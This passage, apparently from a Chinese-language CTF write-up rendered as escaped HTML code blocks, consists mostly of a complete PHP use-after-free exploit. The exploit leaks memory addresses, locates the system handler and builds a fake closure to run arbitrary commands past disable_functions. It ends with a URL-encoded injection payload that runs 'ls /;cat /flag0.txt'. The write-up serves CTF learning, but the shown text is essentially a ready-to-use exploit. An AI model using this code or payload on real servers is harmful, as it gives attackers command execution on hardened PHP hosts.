;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$addr&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$addr&lt;/span&gt; += &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$f_entry&lt;/span&gt; != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;trigger_uaf&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$arg&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# str_shuffle prevents opcache string interning&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$arg&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_shuffle&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$vuln&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Vuln&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$vuln&lt;/span&gt;-&amp;gt;a = &lt;span class=&#34;variable&#34;&gt;$arg&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;stristr&lt;/span&gt;(PHP_OS, &lt;span class=&#34;string&#34;&gt;&amp;#x27;WIN&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;This PoC is for *nix systems only.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$n_alloc&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;# increase this value if UAF fails&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$contiguous&lt;/span&gt; = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; &amp;lt; &lt;span class=&#34;variable&#34;&gt;$n_alloc&lt;/span&gt;; &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$contiguous&lt;/span&gt;[] = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_shuffle&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;trigger_uaf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;x&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$backtrace&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;args&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$helper&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Helper&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$helper&lt;/span&gt;-&amp;gt;b = &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; (&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$x&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;79&lt;/span&gt; || &lt;span class=&#34;title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;UAF failed&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# leaks&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$closure_handlers&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str2ptr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$php_heap&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str2ptr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x58&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$abc_addr&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$php_heap&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0xc8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# fake value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# fake reference&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$abc_addr&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$closure_obj&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str2ptr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$binary_leak&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$closure_handlers&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!(&lt;span class=&#34;variable&#34;&gt;$base&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;get_binary_base&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$binary_leak&lt;/span&gt;))) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Couldn&amp;#x27;t determine binary base address&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!(&lt;span class=&#34;variable&#34;&gt;$elf&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;parse_elf&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$base&lt;/span&gt;))) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Couldn&amp;#x27;t parse ELF header&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!(&lt;span class=&#34;variable&#34;&gt;$basic_funcs&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;get_basic_funcs&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$base&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$elf&lt;/span&gt;))) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Couldn&amp;#x27;t get basic_functions address&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!(&lt;span class=&#34;variable&#34;&gt;$zif_system&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;get_system&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$basic_funcs&lt;/span&gt;))) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Couldn&amp;#x27;t get zif_system address&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# fake closure object&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$fake_obj_offset&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0xd0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; &amp;lt; &lt;span class=&#34;number&#34;&gt;0x110&lt;/span&gt;; &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; += &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$fake_obj_offset&lt;/span&gt; + &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;, &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$closure_obj&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# pwn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$abc_addr&lt;/span&gt; + &lt;span class=&#34;variable&#34;&gt;$fake_obj_offset&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0xd0&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x38&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;# internal func type&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0xd0&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$zif_system&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;# internal func handler&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    (&lt;span class=&#34;variable&#34;&gt;$helper&lt;/span&gt;-&amp;gt;b)(&lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		直接贴一个payload：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c=%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;f%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;e%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;c%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;fphp%&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;apwn(%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;ls+%&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;f%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;bcat+%&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;fflag0.txt%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;)%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;b%&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;a%&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;afunction+&lt;span class=&#34;title function_ invoke__&#34;&gt;pwn&lt;/span&gt;(%&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;cmd)+%&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;b%&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;a++++&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt;+%&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;abc%&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;c+%&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;helper%&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;c+%&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;backtrace%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;b%&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;a++++&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt;+&lt;span class=&#34;title&#34;&gt;Vuln&lt;/span&gt;+%7&lt;span class=&#34;title&#34;&gt;b&lt;/span&gt;%0&lt;span class=&#34;title&#34;&gt;a&lt;/span&gt;++++++++&lt;span class=&#34;title&#34;&gt;public&lt;/span&gt;+%24&lt;span class=&#34;title&#34;&gt;a&lt;/span&gt;%3&lt;span cl